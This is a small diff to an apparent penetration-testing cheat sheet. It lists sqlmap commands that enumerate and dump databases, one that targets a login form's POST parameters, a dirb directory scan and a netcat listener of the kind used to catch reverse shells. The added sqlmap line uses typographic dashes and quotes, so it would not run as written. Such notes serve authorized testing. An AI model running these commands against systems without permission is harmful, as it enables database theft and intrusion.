@@ -16,6 +16,12 @@ sqlmap -u url -D database --dump-all --batch
 sqlmap -u url --dbs --batch
 
 
+sqlmap -u http://site-to-test.com/admin/index.php –data=”user=admin&password=admin” -p user
+
+
+–data = POST data
+
+
 dirb url
 
 netcat -lnvp 9191 
